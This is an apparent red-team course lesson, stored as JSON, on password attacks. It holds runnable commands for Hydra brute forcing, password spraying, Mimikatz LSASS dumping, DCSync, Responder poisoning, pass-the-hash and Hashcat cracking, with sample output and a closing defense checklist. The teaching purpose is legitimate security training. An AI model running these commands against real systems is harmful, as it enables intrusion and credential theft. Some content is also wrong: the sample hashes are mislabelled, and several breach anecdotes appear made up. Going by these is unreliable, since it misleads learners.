{
  "lesson_id": "5915f692-0956-4f5c-a187-f461e6972217",
  "domain": "red_team",
  "title": "Password Attacks & Credential Harvesting",
  "subtitle": "Attacking authentication, cracking hashes, and harvesting credentials",
  "difficulty": 2,
  "estimated_time": 50,
  "order_index": 7,
  "prerequisites": [],
  "concepts": [
    "Password Cracking",
    "Hash Cracking",
    "Credential Harvesting",
    "Pass-the-Hash",
    "Mimikatz",
    "Hydra",
    "Hashcat",
    "John the Ripper"
  ],
  "learning_objectives": [
    "Understand different password attack techniques and when to use each",
    "Master hash cracking with Hashcat and John the Ripper",
    "Learn credential harvesting techniques on Windows and Linux",
    "Perform Pass-the-Hash and Pass-the-Ticket attacks"
  ],
  "content_blocks": [
    {
      "block_id": "f1e2d3c4-b5a6-4978-8e9f-0a1b2c3d4e5f",
      "type": "mindset_coach",
      "title": "The Art of Password Attacks",
      "content": {
        "text": "Welcome to password attacks - the gateway to privilege escalation!\n\nYou're about to learn one of the most critical skills in offensive security. Passwords are still the #1 authentication method, which makes them the #1 target for attackers.\n\n**Here's the truth**: In 2023, 81% of data breaches involved stolen or weak passwords (Verizon DBIR). Despite decades of security awareness, users still choose \"Password123!\" and reuse credentials across services.\n\n**The Jim Kwik principle at work**: We'll use ACTIVE LEARNING - you won't just read about password cracking, you'll see real attack outputs and learn to recognize weak passwords instantly. We'll GAMIFY IT - watching a hash crack is oddly satisfying.\n\n**Why this matters**: The 2020 SolarWinds breach began with a compromised password. The 2021 Colonial Pipeline ransomware attack started with a leaked VPN password. Your ability to attack, crack, and defend against password attacks directly impacts an organization's security posture.\n\n**Your goal for this lesson**: Master password attacks so thoroughly that you can assess password security, crack hashes efficiently, and understand how attackers harvest credentials - then use that knowledge to defend better.\n\n**Think like an attacker, defend like a champion**: Every technique you learn here has a defensive counterpart. As you study each attack, ask yourself: \"How would I detect this? How would I prevent it?\""
      }
    },
    {
      "block_id": "a2b3c4d5-e6f7-4a89-9b0c-1d2e3f4a5b6c",
      "type": "explanation",
      "title": "Password Attack Taxonomy: Understanding the Complete Arsenal",
      "content": {
        "text": "## Understanding Password Attacks\n\nPassword attacks fall into several categories, each with specific use cases and trade-offs. Let's break down the complete taxonomy:\n\n### 1. Online Password Attacks\n\n**Definition**: Attacking authentication services directly over the network (SSH, RDP, web login forms, APIs)\n\n**Characteristics**:\n- Works in real-time against live services\n- Immediate access if successful\n- No need to obtain password hashes first\n- Slow (network latency, rate limiting, server processing)\n- Easily detected (logs, IDS, SIEM alerts, account lockouts)\n- Risk of account lockout after failed attempts\n- Legal implications if unauthorized\n\n**Tools**: Hydra, Medusa, CrackMapExec, Metasploit auxiliary modules, Burp Suite Intruder, Patator\n\n**Attack Subtypes**:\n\n**1a. Brute Force**: Try all possible character combinations\n\nExample: a, aa, ab, ac... zzz, zzzz\nPros: Guaranteed success given enough time\nCons: Exponentially slow (8-char = 218 trillion combinations)\nBest for: Short passwords (4-6 characters), numeric PINs\n\n**1b. Dictionary Attack**: Try words from a wordlist\n\nExample: password, 123456, admin, letmein, welcome\nPros: Fast, targets common passwords\nCons: Fails against complex passwords\nBest for: Initial reconnaissance, weak password policies\n\n**1c. Password Spraying**: Try one password against many accounts\n\nExample: Try \"Password123!\" against 1000 users\nPros: Avoids account lockout\nCons: Lower success rate per attempt\nBest for: Active Directory, Office 365, enterprise environments\n\n**1d. Credential Stuffing**: Use breached credentials from other services\n\nExample: Try credentials from LinkedIn breach against company VPN\nPros: High success rate (password reuse is common)\nCons: Requires obtaining breach data first\nBest for: External services, consumer applications\n\n**When to use online attacks**: \n- You don't have password hashes\n- Testing specific accounts or services\n- Services without rate limiting or monitoring\n- After discovering valid usernames (enumerate first, attack second)\n- During penetration tests with proper authorization\n\n**Real-world example**: In 2020, attackers compromised Citrix VPN by spraying \"Password123!\" across 5,000 employee accounts. Only took 3 successful attempts to gain initial access.\n\n### 2. Offline Password Attacks (Hash Cracking)\n\n**Definition**: Cracking password hashes obtained from database dumps, memory, file systems, or network captures\n\n**Characteristics**:\n- Very fast (millions to billions of attempts per second with GPU)\n- No detection risk (completely offline)\n- No account lockout\n- Can pause and resume at will\n- Requires hash acquisition first (higher privilege needed)\n- Strong hashes take time (bcrypt, scrypt, Argon2)\n- Salted hashes require per-hash cracking (no rainbow tables)\n\n**Tools**: Hashcat (GPU-based, fastest), John the Ripper (CPU-based, versatile), Ophcrack (rainbow tables), hashID (hash identification)\n\n**Common Hash Types You'll Encounter**:\n\nMD5:        32 hex characters (unsalted, very fast to crack)\nSHA-1:      40 hex characters (unsalted, fast to crack)\nNTLM:       32 hex characters (Windows, unsalted, VERY fast)\nSHA-256:    64 hex characters (salted variants slower)\nSHA-512:    128 hex characters (Linux/Unix, salted)\nbcrypt:     60 characters starting with $2a$, $2b$, or $2y$ (slow by design)\nscrypt:     Variable length, starts with $scrypt$ (memory-hard)\nArgon2:     Variable length, starts with $argon2 (modern, very secure)\n\n**Cracking Speed Comparison** (NVIDIA RTX 4090, approximate):\n\nHash Type       Speed               Time to crack 8-char random\n----------------------------------------------------------------\nMD5             200 GH/s            ~5 hours\nSHA-1           70 GH/s             ~14 hours  \nNTLM            240 GH/s            ~4 hours\nSHA-256         4 GH/s              ~30 days\nbcrypt (cost 12) 100 KH/s           ~100 years\nscrypt          10 KH/s             ~1000 years\n\n**When to use offline attacks**:\n- After dumping SAM/NTDS.dit from Windows systems\n- Found hashes in database breach or SQL injection\n- Extracted from memory with Mimikatz\n- Captured NetNTLMv2 hashes from network (Responder)\n- Found in configuration files or scripts\n- Password-protected files (ZIP, PDF, Office documents)\n\n**Real-world example**: In the 2012 LinkedIn breach, 6.5 million unsalted SHA-1 hashes were stolen. Security researchers cracked 90% of them within days.\n\n### 3. Pass-the-Hash (PtH) Attacks\n\n**Definition**: Using password hashes directly for authentication without cracking them to plaintext\n\n**Characteristics**:\n- No cracking needed (save time and resources)\n- Works even with strong passwords (complexity doesn't matter)\n- Fast lateral movement across Windows networks\n- Bypasses password complexity requirements\n- Only works with NTLM authentication (Windows-specific)\n- Requires local admin or SYSTEM privileges to extract hashes\n- Doesn't work with Kerberos (need Pass-the-Ticket instead)\n- Fails if NTLM is disabled (Kerberos-only environments)\n\n**Tools**: Mimikatz (sekurlsa::pth), CrackMapExec (--local-auth -H), Impacket (psexec.py -hashes), Metasploit (psexec module)\n\n**How PtH Works**:\n\nNormal Authentication:\nUser enters password → System hashes password → Compares hash to stored hash\n\nPass-the-Hash:\nAttacker provides hash directly → System accepts hash → Authentication succeeds\n\nWhy it works: NTLM protocol authenticates with the hash, not the password\n\n**When to use Pass-the-Hash**:\n- Windows environments with NTLM enabled (most enterprises)\n- You have NTLM hashes but can't crack them (strong passwords)\n- Need immediate lateral movement (no time to crack)\n- Password is too complex to crack in reasonable time\n- Testing lateral movement capabilities during pentests\n\n**Real-world example**: In the 2014 Sony Pictures breach, attackers used Pass-the-Hash to move from workstations to domain controllers within hours, even though admin passwords were 15+ characters.\n\n### 4. Credential Harvesting\n\n**Definition**: Extracting plaintext credentials from memory, files, configuration, browser storage, or network traffic\n\n**Characteristics**:\n- Gets plaintext passwords (no cracking needed)\n- No brute force or guessing required\n- Often finds service account passwords (high-value targets)\n- Multiple methods available (memory, files, network, phishing)\n- Requires system access first (initial foothold)\n- May require elevated privileges (SYSTEM for LSASS)\n- Credentials may be encrypted (need to decrypt)\n- Some methods trigger AV/EDR alerts\n\n**Tools**: Mimikatz (LSASS dumping), LaZagne (browser/app passwords), Responder (network capture), Inveigh (LLMNR/NBT-NS poisoning), PCredz (PCAP parsing)\n\n**Harvesting Sources**:\n\n**4a. Memory Dumping**:\n\nTarget: LSASS.exe process (Local Security Authority Subsystem Service)\nContains: Plaintext passwords (if WDigest enabled), NTLM hashes, Kerberos tickets\nRequires: SYSTEM or SeDebugPrivilege\nTool: Mimikatz sekurlsa::logonpasswords\n\n**4b. Browser Passwords**:\n\nTarget: Chrome (Login Data), Firefox (logins.json), Edge (Login Data)\nContains: Saved website credentials\nRequires: User context or local admin\nTool: LaZagne.exe browsers, Mimikatz dpapi\n\n**4c. Network Capture**:\n\nTarget: LLMNR/NBT-NS/mDNS broadcast authentication\nContains: NetNTLMv2 challenge-response hashes\nRequires: Network access\nTool: Responder -I eth0 -wrf\n\n**4d. File and Registry**:\n\nTarget: Configuration files, scripts, registry (Putty sessions, WinSCP, FileZilla)\nContains: Plaintext or encrypted passwords\nRequires: File system access\nTool: grep, findstr, reg query\n\n**When to use credential harvesting**:\n- After gaining initial foothold on a system\n- Privilege escalation attempts\n- Finding credentials for lateral movement\n- Discovering service account passwords\n- Post-exploitation during pentests\n\n**Real-world example**: In 2023, attackers harvested Citrix credentials from memory using a custom Mimikatz variant, discovering a domain admin password stored in plaintext. This led to full domain compromise within 48 hours.\n\n## Attack Flow Decision Tree\n\nHere's how to choose the right attack:\n\nDo you have system access?\n|\nNO  → Online Password Attacks\n|     |\n|     ├─ Have usernames? → Password Spray\n|     ├─ No usernames? → Enumerate first (OSINT, LDAP, SMB)\n|     ├─ Weak security? → Brute force with Hydra\n|     └─ Found breach? → Credential Stuffing\n|\nYES → Do you have hashes?\n|     |\n|     YES → What hash type?\n|     |     |\n|     |     ├─ Windows NTLM? → Pass-the-Hash (skip cracking!)\n|     |     ├─ NetNTLMv2? → Crack offline with Hashcat\n|     |     ├─ bcrypt/scrypt? → Crack if password policy weak, else move on\n|     |     ├─ MD5/SHA-1? → Crack immediately (very fast)\n|     |     └─ Salted SHA-256/512? → Crack with wordlist + rules\n|     |\n|     NO  → Credential Harvesting\n|           |\n|           ├─ Have admin? → Dump LSASS with Mimikatz\n|           ├─ User context? → Extract browser passwords with LaZagne\n|           ├─ Network access? → Capture credentials with Responder\n|           └─ File access? → Search scripts, config files, registry\n\n## Password Attack Methodology (Step-by-Step)\n\nFollow this methodology for comprehensive password attacks:\n\n**Phase 1: Reconnaissance (Pre-Attack Intelligence)**\n\n# Identify authentication methods\nnmap -p 22,23,139,445,3389,5985,5986 -sV 192.168.1.0/24\n\n# Enumerate valid usernames\nenum4linux -U 192.168.1.100  # SMB enumeration\nldapsearch -x -H ldap://192.168.1.100 -b \"dc=company,dc=com\" \"(objectClass=user)\" samaccountname\n\n# Check password policy (avoid lockouts!)\nenum4linux -P 192.168.1.100\ncrackmapexec smb 192.168.1.100 --pass-pol\n\n# Identify hash types in use\n# Windows: NTLM (LM deprecated)\n# Linux: SHA-512 (check /etc/shadow)\n# Web apps: varies (MD5, bcrypt, SHA-256)\n\n**Phase 2: Initial Access (Getting First Credentials)**\n\n# Try default credentials first\ncrackmapexec smb 192.168.1.0/24 -u administrator -p admin\ncrackmapexec ssh 192.168.1.0/24 -u root -p root\n\n# Check common passwords\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100\n\n# Password spray (safe - avoids lockout)\ncrackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123!' --continue-on-success\n\n# Search for credential leaks\ngh-dorks -r company-name -w passwords\ntrufflehog --regex git clone https://github.com/company/repo\n\n**Phase 3: Credential Access (Post-Compromise Harvesting)**\n\n# Dump password hashes (Windows)\nmimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords  # Plaintext passwords\nmimikatz # lsadump::sam               # Local account hashes\nmimikatz # lsadump::secrets           # Cached passwords\n\n# Dump password hashes (Linux)\nsudo cat /etc/shadow\nsudo unshadow /etc/passwd /etc/shadow > hashes.txt\n\n# Extract from memory\nprocdump64.exe -ma lsass.exe lsass.dmp  # On target\nmimikatz # sekurlsa::minidump lsass.dmp # Offline analysis\n\n# Search files and scripts\nfindstr /spin \"password\" *.txt *.config *.xml *.ini\ngrep -r \"password\" /home /var/www /opt 2>/dev/null\n\n# Capture network authentication (LLMNR poisoning)\nresponder -I eth0 -wrf\n# Wait for users to mistype server names → Capture NetNTLMv2 hashes\n\n**Phase 4: Credential Cracking (Offline Hash Cracking)**\n\n# Identify hash type\nhashcat --example-hashes | grep -i ntlm\nhashid '$2y$10$N9qo8uLOickgx2ZMRZoMyeIjZ...'\n\n# Crack with wordlist\nhashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt\n\n# Crack with rules (mutations)\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n\n# Mask attack (if you know password pattern)\nhashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?l?d?d  # Password12\n\n# Show cracked passwords\nhashcat -m 1000 --show ntlm.txt\n\n**Phase 5: Lateral Movement (Using Obtained Credentials)**\n\n# Test credentials across network\ncrackmapexec smb 192.168.1.0/24 -u admin -p 'Cracked123!'\n\n# Pass-the-Hash (if NTLM hash)\ncrackmapexec smb 192.168.1.0/24 -u admin -H 'aad3b435...8846f7ea...'\n\n# Spray credentials\nfor ip in $(cat targets.txt); do\n  crackmapexec smb $ip -u admin -p 'Cracked123!' --continue-on-success\ndone\n\n# Escalate to Domain Admin (if possible)\nmimikatz # lsadump::dcsync /user:Administrator  # DCSync attack\n\n**Memory Aid - Attack Methodology Acronym**: \n\n**RICCL** (pronounce \"rickle\") = **R**econ, **I**nitial, **C**redential, **C**racking, **L**ateral\n\n1. **R**econ: Enumerate users, identify services, check password policy\n2. **I**nitial: Default credentials, password spray, common passwords\n3. **C**redential: Dump hashes, search files, capture network auth\n4. **C**racking: Hashcat/John, wordlists + rules, mask attacks\n5. **L**ateral: Test credentials, Pass-the-Hash, escalate privileges\n\nThis methodology ensures you don't miss opportunities and provides a clear progression from external reconnaissance to domain compromise."
      }
    },
    {
      "block_id": "b3c4d5e6-f7a8-4b90-9c0d-1e2f3a4b5c6d",
      "type": "code_exercise",
      "title": "Hands-On: Hashcat GPU Password Cracking",
      "content": {
        "text": "## What is Hashcat?\n\n**Hashcat** is the world's fastest password cracker, supporting 300+ hash types with GPU acceleration. It can crack billions of hashes per second using your graphics card.\n\n**Why GPU vs CPU?**\n\nGPUs excel at password cracking because:\n- Massively parallel architecture (thousands of cores)\n- Optimized for repetitive calculations (hash functions)\n- 100-1000x faster than CPU for cracking\n\nNVIDIA RTX 4090 GPU:\n- MD5: 200 BILLION hashes/second\n- NTLM: 240 BILLION hashes/second\n- bcrypt: 100 THOUSAND hashes/second\n\nIntel i9-13900K CPU:\n- MD5: 500 MILLION hashes/second (400x slower!)\n- NTLM: 300 MILLION hashes/second (800x slower!)\n\n## Installing Hashcat\n\n### Kali Linux (Pre-installed)\n\nhashcat --version\n\n### Ubuntu/Debian\n\nsudo apt update\nsudo apt install hashcat opencl-headers nvidia-driver-535\nsudo reboot\n\n# Verify GPU detected\nhashcat -I\n\n### Windows\n\n1. Download from: https://hashcat.net/hashcat/\n2. Extract to C:\\Tools\\hashcat\n3. Install NVIDIA CUDA drivers\n4. Run: hashcat.exe -I\n\n## Basic Hashcat Syntax\n\nhashcat -m <hash_mode> -a <attack_mode> <hash_file> <wordlist> [options]\n\n**Parameters:**\n-m <mode>    : Hash type (0=MD5, 1000=NTLM, 1800=sha512crypt)\n-a <attack>  : Attack mode (0=wordlist, 3=mask/brute-force)\n<hash_file>  : File containing hashes to crack\n<wordlist>   : Dictionary file for attack mode 0\n\n**Common Hash Modes:**\n\n0     - MD5\n100   - SHA1\n1000  - NTLM (Windows)\n1400  - SHA256\n1700  - SHA512\n1800  - sha512crypt (Linux /etc/shadow)\n3200  - bcrypt\n5600  - NetNTLMv2\n13100 - Kerberos 5 TGS-REP\n22000 - WPA-PBKDF2-PMKID+EAPOL\n\n## Exercise 1: Cracking NTLM Hashes\n\n### Step 1: Create Sample Hash File\n\n# Create ntlm.txt with sample NTLM hashes\ncat << EOF > ntlm.txt\n8846f7eaee8fb117ad06bdd830b7586c\n5f4dcc3b5aa765d61d8327deb882cf99\n7c6a180b36896a0a8c02787eeafb0e4c\nEOF\n\n# These are NTLM hashes for:\n# password123\n# password\n# Password1\n\n### Step 2: Basic Wordlist Attack\n\n# Crack using rockyou.txt wordlist\nhashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt\n\n# Output:\nHashcat (v6.2.6) starting...\n\nSession..........: hashcat\nStatus...........: Running\nHash.Mode........: 1000 (NTLM)\nHash.Target......: ntlm.txt\nTime.Started.....: Mon Jan 20 14:32:18 2025\nSpeed.#1.........: 240.0 GH/s (GPU)\nRecovered........: 2/3 (66.67%)\nProgress.........: 1000000/14344384 (6.97%)\nETC..............: Mon Jan 20 14:33:22 2025\n\n8846f7eaee8fb117ad06bdd830b7586c:password123\n5f4dcc3b5aa765d61d8327deb882cf99:password\n\n# 2 out of 3 cracked! (\"Password1\" with capital P not in rockyou.txt)\n\n### Step 3: View Cracked Results\n\n# Show all cracked hashes\nhashcat -m 1000 --show ntlm.txt\n\n# Output:\n8846f7eaee8fb117ad06bdd830b7586c:password123\n5f4dcc3b5aa765d61d8327deb882cf99:password\n\n### Step 4: Rule-Based Attack (Crack the Last Hash)\n\n# Apply password mutation rules\nhashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n\n# best64.rule applies mutations:\n# password → Password (capitalize first)\n# password → PASSWORD (uppercase all)\n# password → password1 (append digit)\n# password → password! (append special)\n# ...64 different rules\n\n# Output:\n7c6a180b36896a0a8c02787eeafb0e4c:Password1\n\n# SUCCESS! All 3 hashes cracked.\n\n## Exercise 2: Mask Attack (Brute Force)\n\n**Mask Attack** tries all combinations for a specific pattern.\n\n**Mask Syntax:**\n\n?l   lowercase (a-z)         [26 chars]\n?u   uppercase (A-Z)         [26 chars]\n?d   digit (0-9)             [10 chars]\n?s   special (!@#$%...)      [32 chars]\n?a   all of above            [94 chars]\n\n### Example: Corporate Password Pattern\n\nMany companies require: Capital letter + lowercase letters + 2 digits\nExample: Password12, Summer24, Winter99\n\n# Crack pattern: ?u?l?l?l?l?l?l?l?d?d\nhashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?l?l?l?d?d\n\n# This tries:\n# Aaaaaaaa00, Aaaaaaaa01, Aaaaaaaa02... Zzzzzzzz99\n\n# If password is \"Password12\", it WILL be found\n\n### Example: 4-Digit PIN\n\n# Create hash for PIN \"1234\"\necho -n \"1234\" | iconv -t utf-16le | openssl md4 | cut -d' ' -f2 > pin.txt\n# Result: 5fb21150866e8e85ce1b35af1edb7e7e\n\n# Crack 4-digit PIN\nhashcat -m 1000 -a 3 pin.txt ?d?d?d?d\n\n# Tries: 0000, 0001, 0002... 9999 (10,000 combinations)\n# Completes in < 1 second on GPU\n\n### Example: Incremental Brute Force\n\n# Try all possible passwords from 1-8 characters\nhashcat -m 1000 -a 3 ntlm.txt --increment --increment-min=1 --increment-max=8 ?a?a?a?a?a?a?a?a\n\n# This tries:\n# Length 1: a, b, c... Z, 0, !\n# Length 2: aa, ab, ac... Z!, !!\n# Length 3: aaa, aab... !!!\n# ...\n# Length 8: aaaaaaaa... !!!!!!!!!\n\n# WARNING: 8-char all possibilities = 6 quadrillion combinations\n# Even at 240 GH/s, this takes ~7 hours for NTLM\n\n## Exercise 3: Cracking Linux Passwords\n\n### Step 1: Extract Hashes from /etc/shadow\n\n# On target Linux system (requires root)\nsudo cat /etc/shadow > shadow.txt\n\n# Example shadow entry:\nroot:$6$rounds=5000$saltsalt$hash...:18000:0:99999:7:::\n\n# Format:\n# username:$algorithm$salt$hash:lastchange:min:max:warn:inactive:expire\n\n# Algorithms:\n# $1$ = MD5 (old, weak)\n# $5$ = SHA-256\n# $6$ = SHA-512 (most common)\n# $y$ = yescrypt (modern)\n\n### Step 2: Extract Just the Hashes\n\n# Remove everything except hash portion\ncat shadow.txt | cut -d':' -f2 > linux_hashes.txt\n\n### Step 3: Crack with Hashcat\n\n# SHA-512 crypt is mode 1800\nhashcat -m 1800 -a 0 linux_hashes.txt /usr/share/wordlists/rockyou.txt\n\n# Note: SHA-512 crypt is MUCH slower than NTLM\n# Speed: ~100,000 H/s vs 240 billion H/s for NTLM\n# This is intentional - designed to resist cracking\n\n### Alternative: Use John the Ripper\n\n# John can auto-detect hash format\nsudo unshadow /etc/passwd /etc/shadow > combined.txt\njohn combined.txt --wordlist=/usr/share/wordlists/rockyou.txt\n\n# Show cracked passwords\njohn --show combined.txt\n\n## Exercise 4: NetNTLMv2 Hash Cracking\n\n**NetNTLMv2** hashes are captured from network authentication (LLMNR/NBT-NS poisoning with Responder).\n\n### Step 1: Capture NetNTLMv2 Hash (Simulated)\n\n# Captured hash format:\nuser::DOMAIN:1122334455667788:hash1:hash2\n\n# Example:\nadmin::CORP:1122334455667788:9a8b7c6d5e4f3a2b:1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f\n\n# Save to netntlmv2.txt\n\n### Step 2: Crack with Hashcat\n\n# NetNTLMv2 is mode 5600\nhashcat -m 5600 -a 0 netntlmv2.txt /usr/share/wordlists/rockyou.txt\n\n# If successful:\nadmin::CORP:1122334455667788:9a8b7c6d5e4f3a2b:1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f:Password123\n\n## Performance Optimization\n\n### Check GPU Status\n\n# List available devices\nhashcat -I\n\n# Output:\nBackend Device ID #1 (Alias: #2)\n  Type...........: GPU\n  Vendor.ID......: 2 (NVIDIA)\n  Name...........: NVIDIA GeForce RTX 4090\n  Processor(s)...: 128\n  Clock..........: 2520 MHz\n  Memory.Total...: 24564 MB\n  Memory.Free....: 23000 MB\n\n### Workload Tuning\n\n# -w N: Workload profile\n# 1 = Low (desktop usable, slower)\n# 2 = Default (balanced)\n# 3 = High (GPU dedicated, faster)\n# 4 = Nightmare (max speed, system unresponsive)\n\n# Use max performance\nhashcat -m 1000 -a 0 -w 4 ntlm.txt rockyou.txt\n\n### Session Management\n\n# Start named session\nhashcat -m 1000 -a 0 --session=mysession ntlm.txt rockyou.txt\n\n# Pause (press 'p' or Ctrl+C)\n# Session automatically saved\n\n# Resume session\nhashcat --session=mysession --restore\n\n# Check status during cracking\n# Press 's' for status\n# Press 'q' to quit (saves session)\n\n## Advanced: Custom Wordlist Creation\n\n### Generate Company-Specific Wordlist\n\n# Use cewl to spider company website\ncewl https://company.com -m 6 -d 2 -w company_words.txt\n\n# -m 6    : minimum word length 6\n# -d 2    : spider depth 2 levels\n# -w file : output file\n\n# Add common password patterns\ncat << EOF >> company_words.txt\nCompany2024\nCompany2025\nPassword123\nWelcome123\nAdmin@123\nEOF\n\n# Crack with custom wordlist\nhashcat -m 1000 -a 0 ntlm.txt company_words.txt -r /usr/share/hashcat/rules/best64.rule\n\n### Create Hybrid Attack (Wordlist + Mask)\n\n# Attack mode 6: wordlist + mask\n# Tries: <word><mask>\n\n# Example: password + 3 digits\nhashcat -m 1000 -a 6 ntlm.txt rockyou.txt ?d?d?d\n\n# Tries:\n# password000, password001, password002... password999\n# welcome000, welcome001... welcome999\n# admin000, admin001... admin999\n\n# Attack mode 7: mask + wordlist\n# Tries: <mask><word>\n\n# Example: 3 digits + password\nhashcat -m 1000 -a 7 ntlm.txt ?d?d?d rockyou.txt\n\n# Tries:\n# 000password, 001password... 999password\n# 000welcome, 001welcome... 999welcome\n\n## Real-World Cracking Strategy\n\n### Stage 1: Quick Wins (5 minutes)\n\n# Try top 10,000 most common passwords\nhashcat -m 1000 -a 0 ntlm.txt /usr/share/seclists/Passwords/darkweb2017-top10000.txt\n\n# Expected: 20-40% of weak passwords cracked\n\n### Stage 2: Full Wordlist (1 hour)\n\n# RockYou (14 million passwords)\nhashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt\n\n# Expected: Another 10-20% cracked\n\n### Stage 3: Wordlist + Rules (3 hours)\n\n# Apply best64 rules\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n\n# Expected: Another 10-15% cracked\n# Catches: Password123, Welcome2024, Admin!\n\n### Stage 4: Targeted Masks (12 hours)\n\n# Corporate pattern: Capital + 7 lowercase + 2 digits\nhashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?l?l?l?d?d\n\n# Expected: Another 5-10% cracked\n\n### Stage 5: When to Stop\n\n# For bcrypt/scrypt, calculate time estimate:\n# bcrypt @ 100,000 H/s\n# 8-char random = 94^8 = 6 quadrillion\n# Time = 6e15 / 100000 / 60 / 60 / 24 / 365 = 1,900 years\n\n# Decision: Move on to other targets\n\n## Key Takeaways\n\n1. **GPU is essential** for efficient cracking (100-1000x faster)\n2. **Hash type matters** - NTLM cracks instantly, bcrypt takes years\n3. **Start with wordlists** before brute force (higher success rate)\n4. **Rules multiply effectiveness** - best64 tries 64 variations per word\n5. **Know when to stop** - some passwords are economically infeasible to crack\n6. **Defense**: Use bcrypt/scrypt/Argon2, not MD5/SHA-1/NTLM\n\nPassword cracking is both science and art. Understanding the math helps you make intelligent decisions about where to invest cracking time."
      }
    },
    {
      "block_id": "c4d5e6f7-a8b9-4c01-9d0e-1f2a3b4c5d6e",
      "type": "memory_aid",
      "title": "Password Attack Memory Aids",
      "content": {
        "text": "## Mnemonic: HASH-CRACK\n\n**H** - **Hydra**: Online attacks (SSH, RDP, HTTP)\n**A** - **Acquisition**: Get hashes first (Mimikatz, /etc/shadow)\n**S** - **Speed**: GPU >>> CPU (1000x faster)\n**H** - **Hash types**: Know your target (NTLM vs bcrypt)\n\n**C** - **Crack methods**: Wordlist → Rules → Mask → Hybrid\n**R** - **RockYou**: 14 million passwords, start here\n**A** - **Attack modes**: 0=wordlist, 3=mask, 6=hybrid\n**C** - **Credential harvest**: Memory, files, network, browsers\n**K** - **Keyspace**: 94^8 = 6 quadrillion (8 random chars)\n\n## Quick Reference Card\n\n### Hashcat Attack Modes\n\n-a 0   Straight (wordlist)\n-a 1   Combination (wordlist1 + wordlist2)\n-a 3   Brute-force (mask)\n-a 6   Hybrid (wordlist + mask)\n-a 7   Hybrid (mask + wordlist)\n\n### Common Hash Modes\n\n-m 0      MD5\n-m 100    SHA1\n-m 1000   NTLM (Windows)\n-m 1400   SHA256\n-m 1800   sha512crypt (Linux)\n-m 3200   bcrypt\n-m 5600   NetNTLMv2\n\n### Mask Attack Syntax\n\n?l   lowercase (a-z)\n?u   uppercase (A-Z)\n?d   digit (0-9)\n?s   special (!@#$%)\n?a   all above\n\nExample: ?u?l?l?l?l?d?d = Password12\n\n### Cracking Speed Hierarchy (Fast → Slow)\n\n1. NTLM         240 GH/s   (crack instantly)\n2. MD5          200 GH/s   (crack very fast)\n3. SHA-1         70 GH/s   (crack fast)\n4. SHA-256        4 GH/s   (crack medium)\n5. NetNTLMv2      2 GH/s   (crack medium)\n6. sha512crypt  100 KH/s   (crack slow)\n7. bcrypt       100 KH/s   (crack very slow)\n8. scrypt        10 KH/s   (crack extremely slow)\n\nGH/s = billion hashes/second\nKH/s = thousand hashes/second\n\n### Password Spray vs Brute Force\n\n**Brute Force** (BAD - causes lockout):\n- Try 1000 passwords against 1 user\n- Gets locked out after 3-5 attempts\n\n**Password Spray** (GOOD - avoids lockout):\n- Try 1 password against 1000 users\n- Each user only sees 1 failed attempt\n- No lockout triggered\n\n### Credential Harvesting Tools\n\n**Mimikatz**:\n- privilege::debug\n- sekurlsa::logonpasswords (LSASS dump)\n- lsadump::sam (local hashes)\n- lsadump::dcsync (domain hashes)\n\n**LaZagne**:\n- Browser passwords (Chrome, Firefox, Edge)\n- Application passwords (FileZilla, WinSCP)\n- WiFi passwords\n- System passwords\n\n**Responder**:\n- LLMNR/NBT-NS poisoning\n- Captures NetNTLMv2 hashes\n- Passive network sniffing\n\n### Pass-the-Hash Quick Commands\n\n# With CrackMapExec\ncrackmapexec smb 192.168.1.0/24 -u admin -H 'hash' --local-auth\n\n# With Impacket\npsexec.py domain/admin@192.168.1.100 -hashes :hash\n\n# With Mimikatz\nsekurlsa::pth /user:admin /domain:CORP /ntlm:hash /run:cmd\n\n### Defense Checklist\n\n**Prevent Password Cracking**:\n- [ ] Use bcrypt/scrypt/Argon2 (slow hashes)\n- [ ] Salt all hashes (prevent rainbow tables)\n- [ ] Enforce 12+ character passwords\n- [ ] Require complexity (upper, lower, digit, special)\n- [ ] Ban common passwords (use zxcvbn)\n\n**Prevent Credential Theft**:\n- [ ] Deploy Credential Guard (Windows)\n- [ ] Disable WDigest (no plaintext in memory)\n- [ ] Use LAPS (randomize local admin passwords)\n- [ ] Implement MFA/2FA everywhere\n- [ ] Use password managers (unique passwords)\n\n**Prevent Pass-the-Hash**:\n- [ ] Disable NTLM (use Kerberos only)\n- [ ] Implement Privileged Access Workstations (PAWs)\n- [ ] Don't use same local admin password on all systems\n- [ ] Monitor for unusual lateral movement\n\n**Detect Attacks**:\n- [ ] Monitor for multiple failed logins (brute force)\n- [ ] Alert on PsExec/WMIC from user workstations\n- [ ] Log LSASS process access (Mimikatz detection)\n- [ ] Monitor for Pass-the-Hash (Event ID 4624 type 3)\n\n## Attack Decision Tree\n\nSTART HERE:\n\nDo you have system access?\n├─ NO  → ONLINE ATTACKS\n│  └─ Use: Hydra, CrackMapExec, Burp Suite\n│     Pattern: Password spray > Dictionary > Brute force\n│\n└─ YES → Do you have hashes?\n├─ YES → OFFLINE CRACKING\n│  └─ Use: Hashcat (GPU), John (CPU)\n│     Pattern: Wordlist > Rules > Mask > Hybrid\n│\n└─ NO  → CREDENTIAL HARVESTING\n└─ Use: Mimikatz, LaZagne, Responder\nPattern: Memory > Files > Network > Browser\n\n## Common Pitfalls\n\n**Mistake**: Trying to crack bcrypt with brute force\n**Fix**: Bcrypt is designed to resist cracking. Use wordlist + rules only.\n\n**Mistake**: Getting accounts locked out during testing\n**Fix**: Use password spraying (1 password, many users)\n\n**Mistake**: Not identifying hash type correctly\n**Fix**: Use hashid or hashcat --example-hashes\n\n**Mistake**: Wasting time on impossible 